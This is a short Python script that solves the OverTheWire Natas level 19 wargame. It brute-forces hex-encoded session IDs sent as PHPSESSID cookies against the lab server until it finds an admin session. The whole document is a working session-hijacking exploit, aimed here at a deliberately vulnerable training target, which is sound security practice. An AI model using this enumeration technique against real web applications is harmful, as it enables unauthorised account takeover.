#!/usr/bin/python
import httplib2
import urllib
 
h = httplib2.Http()
h.add_credentials("natas19", "********************************")
 
for id in range(641):
    query = urllib.urlencode({'debug': '1', 'username': 'user'})
    resp, content = h.request("http://natas19.natas.labs.overthewire.org/index.php?" + query, method="POST", headers={'Cookie':'PHPSESSID='+(str(id)+'-user').encode('hex')})
    if "You are an admin" in str(content):
        print(str(content))
        break
